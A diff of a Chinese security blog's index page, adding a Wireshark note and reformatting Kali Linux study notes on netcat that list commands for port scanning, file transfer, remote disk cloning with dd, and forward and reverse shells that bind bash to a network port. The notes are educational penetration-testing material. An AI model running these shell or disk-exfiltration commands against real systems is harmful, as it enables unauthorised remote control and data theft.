@@ -204,6 +204,66 @@
   
   <article class="article post card" itemscope itemtype="http://schema.org/Article">
     <div class="post-block">
+      <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/28/%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7-WIRESHARK/">
+      <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <meta itemprop="name" content="Pyrrhax">
+        <meta itemprop="description" content="">
+        <meta itemprop="image" content="/images/avatar.png">
+      </span>
+      <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+        <meta itemprop="name" content="Pyrrhax">
+      </span>
+    </div>
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">
+        <a class="post-title-link post-title-link-external" href="/2020/08/28/%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7-WIRESHARK/" itemprop="url">WireShark&TCPdump</a>
+      </h1>
+      <div class="post-meta">
+        
+        <span class="post-date">
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2020-08-28T17:06:29+08:00">2020-08-28 17:06:29</time></span>
+        </span>
+        
+        
+        
+        <span class="post-meta-divider divider">|</span>
+        
+        <span class="post-categories">
+          
+          <i class="far fa-folder-open"></i><span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a></span><i class="fas fa-angle-right"></i><span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>
+        </span>
+        
+        
+        
+        
+      </div>
+    </header>
+    <main class="post-main" itemprop="articleBody">
+      
+      <h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1><ul>
+<li>抓包嗅探协议分析</li>
+<li>安全专家必备技能</li>
+<li>抓包引擎<ul>
+<li>Libpcap9——Linux</li>
+<li>Winpcap10——Windows</li>
+</ul>
+</li>
+<li>解码能力</li></ul>
+      
+    </main>
+    <footer class="post-footer">
+      
+      <div class="post-tags">
+        
+        <a class="post-tag button" href="/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94/" rel="tag"><i class="fas fa-tags"></i>KaliLinux渗透测试学习笔</a>
+        
+      </div>
+      
+    </footer>
+  </article>
+  
+  <article class="article post card" itemscope itemtype="http://schema.org/Article">
+    <div class="post-block">
       <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/27/%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7%E4%B8%AD%E7%9A%84%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80-NETCAT/">
       <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
         <meta itemprop="name" content="Pyrrhax">
@@ -240,13 +300,17 @@
     </header>
     <main class="post-main" itemprop="articleBody">
       
-      <h1 id="NC——TELNET-BANNER"><a href="#NC——TELNET-BANNER" class="headerlink" title="NC——TELNET / BANNER"></a>NC——TELNET / BANNER</h1><ul>
+      <a id="more"></a>
+<h1 id="NC——TELNET-BANNER"><a href="#NC——TELNET-BANNER" class="headerlink" title="NC——TELNET / BANNER"></a>NC——TELNET / BANNER</h1><ul>
 <li>nc -nv 1.1.1.1 110</li>
 </ul>
 <h1 id="NC——传输文本信息"><a href="#NC——传输文本信息" class="headerlink" title="NC——传输文本信息"></a>NC——传输文本信息</h1><ul>
 <li>nc -l -p 4444</li>
 <li>nc -nv 1.1.1.1 4444<br>审计时，输出到其它计算机<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">nc -l -p 333 &gt; ps.txt<br>ps -aux|nc -nv 10.1.1.12 333 -q 1<br></code></pre></td></tr></table></figure>
-<h1 id="NC——传输文件-目录"><a href="#NC——传输文件-目录" class="headerlink" title="NC——传输文件/目录"></a>NC——传输文件/目录</h1></li>
+
+</li>
+</ul>
+<h1 id="NC——传输文件-目录"><a href="#NC——传输文件-目录" class="headerlink" title="NC——传输文件/目录"></a>NC——传输文件/目录</h1><ul>
 <li>传输文件<ul>
 <li>A:<code>nc -lp 333 &gt; 1.mp4</code></li>
 <li>B:<code>nc -nv 1.1.1.1 333 &lt; 1.mp4 -q 1</code></li>
@@ -262,26 +326,41 @@
 </li>
 <li>传输加密文件<ul>
 <li>A:<code>nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4</code></li>
-<li>B:<code>mcrypt -flush -Fbqd -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</code><h1 id="NC——流媒体服务"><a href="#NC——流媒体服务" class="headerlink" title="NC——流媒体服务"></a>NC——流媒体服务</h1></li>
+<li>B:<code>mcrypt -flush -Fbqd -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</code></li>
 </ul>
 </li>
+</ul>
+<h1 id="NC——流媒体服务"><a href="#NC——流媒体服务" class="headerlink" title="NC——流媒体服务"></a>NC——流媒体服务</h1><ul>
 <li>A:<code>cat 1.mp4 | nc -lp 333</code></li>
-<li>B:<code>nc -nv 1.1.1.1 333 |mplayer -vo x11 -cache 3000 -</code><h1 id="NC——端口扫描"><a href="#NC——端口扫描" class="headerlink" title="NC——端口扫描"></a>NC——端口扫描</h1></li>
+<li>B:<code>nc -nv 1.1.1.1 333 |mplayer -vo x11 -cache 3000 -</code></li>
+</ul>
+<h1 id="NC——端口扫描"><a href="#NC——端口扫描" class="headerlink" title="NC——端口扫描"></a>NC——端口扫描</h1><ul>
 <li><code>nc -nvz 1.1.1.1 -65535</code> TCP端口</li>
-<li><code>nc -nvzu 1.1.1.1 1-1024</code> UDP端口<h1 id="NC——远程硬盘克隆"><a href="#NC——远程硬盘克隆" class="headerlink" title="NC——远程硬盘克隆"></a>NC——远程硬盘克隆</h1></li>
+<li><code>nc -nvzu 1.1.1.1 1-1024</code> UDP端口</li>
+</ul>
+<h1 id="NC——远程硬盘克隆"><a href="#NC——远程硬盘克隆" class="headerlink" title="NC——远程硬盘克隆"></a>NC——远程硬盘克隆</h1><ul>
 <li><code>nc -lp 333|dd of=/dev/sda</code></li>
-<li><code>dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</code><h1 id="NC——远程控制"><a href="#NC——远程控制" class="headerlink" title="NC——远程控制"></a>NC——远程控制</h1></li>
+<li><code>dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</code></li>
+</ul>
+<h1 id="NC——远程控制"><a href="#NC——远程控制" class="headerlink" title="NC——远程控制"></a>NC——远程控制</h1><ul>
 <li>正向：<ul>
 <li>A:<code>nc -lp 333 -c bash</code></li>
-<li>B:<code>nc 1.1.1.1 333</code></li>
+<li>B:<code>nc -nv 1.1.1.1 333</code></li>
 </ul>
 </li>
 <li>反向：<ul>
 <li>A:<code>nc -lp 333</code></li>
-<li>B:<code>nc 1.1.1.1 333 -c bash</code></li>
+<li>B:<code>nc -nv 1.1.1.1 333 -c bash</code></li>
 </ul>
 </li>
 <li>注：Windows把bash改成cmd</li>
+</ul>
+<h1 id="NC——NCAT"><a href="#NC——NCAT" class="headerlink" title="NC——NCAT"></a>NC——NCAT</h1><ul>
+<li>NC缺乏加密和身份验证的能力</li>
+<li>Ncat</li>
+<li>A:<code>ncat ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl</code></li>
+<li>B:<code>ncat -nv 1.1.1.1 333 --ssl</code></li>
+<li>不同平台/系统 nc参数功能不尽相同</li>
 </ul>
 
       
@@ -335,8 +414,14 @@
     </header>
     <main class="post-main" itemprop="articleBody">
       
-      <p>win10地址<br><a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/" target="_blank" rel="noopener">https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/</a><br>下面这个地址的虚拟机环境本是用于测试其中的应用<br><a href="https://www.turnkeylinux.org/" target="_blank" rel="noopener">https://www.turnkeylinux.org/</a><br>Redhat、Ubuntu去官网<br>安装LAMP<br>Metasploitable</p>
-
+      <ul>
+<li>Windows</li>
+<li>Redhat、Ubuntu<ul>
+<li>安装LAMP</li>
+</ul>
+</li>
+<li>Metasploitable</li>
+<li>m0n0wall</li></ul>
       
     </main>
     <footer class="post-footer">
@@ -712,59 +797,6 @@
     </footer>
   </article>
   
-  <article class="article post card" itemscope itemtype="http://schema.org/Article">
-    <div class="post-block">
-      <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/08/%E6%88%91%E7%BF%BB%E8%AF%91%E7%9A%84%E6%96%87%E7%AB%A0%E5%9C%A8%E8%BF%99%E9%87%8C/">
-      <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <meta itemprop="name" content="Pyrrhax">
-        <meta itemprop="description" content="">
-        <meta itemprop="image" content="/images/avatar.png">
-      </span>
-      <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-        <meta itemprop="name" content="Pyrrhax">
-      </span>
-    </div>
-    <header class="post-header">
-      <h1 class="post-title" itemprop="name headline">
-        <a class="post-title-link post-title-link-external" href="/2018/09/08/%E6%88%91%E7%BF%BB%E8%AF%91%E7%9A%84%E6%96%87%E7%AB%A0%E5%9C%A8%E8%BF%99%E9%87%8C/" itemprop="url">我翻译的文章在这里</a>
-      </h1>
-      <div class="post-meta">
-        
-        <span class="post-date">
-          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2018-09-08T00:00:00+08:00">2018-09-08 00:00:00</time></span>
-        </span>
-        
-        
-        
-        <span class="post-meta-divider divider">|</span>
-        
-        <span class="post-categories">
-          
-          <i class="far fa-folder-open"></i><span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E7%BF%BB%E8%AF%91/" itemprop="url" rel="index"><span itemprop="name">翻译</span></a></span>
-        </span>
-        
-        
-        
-        
-      </div>
-    </header>
-    <main class="post-main" itemprop="articleBody">
-      
-      <p><a href="https://cloud.tencent.com/developer/user/1206354/articles" target="_blank" rel="noopener">这里是我腾讯云+社区的个人中心</a>，里面有我翻译的几篇文章。<br>虽然并不是专业的翻译，不过收到赞和关注的时候还是小有成就感&gt;&lt;。</p>
-
-      
-    </main>
-    <footer class="post-footer">
-      
-      <div class="post-tags">
-        
-        <a class="post-tag button" href="/tags/%E7%BF%BB%E8%AF%91/" rel="tag"><i class="fas fa-tags"></i>翻译</a>
-        
-      </div>
-      
-    </footer>
-  </article>
-  
   
   <nav class="pagination">
     <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-angle-right" aria-label="下一页"></i></a>
@@ -811,7 +843,7 @@
     
     <div class="archives-count count-block">
       <div class="site-count-title">归档</div>
-      <div><a href="/archives/">13</a></div>
+      <div><a href="/archives/">14</a></div>
     </div>
     
     
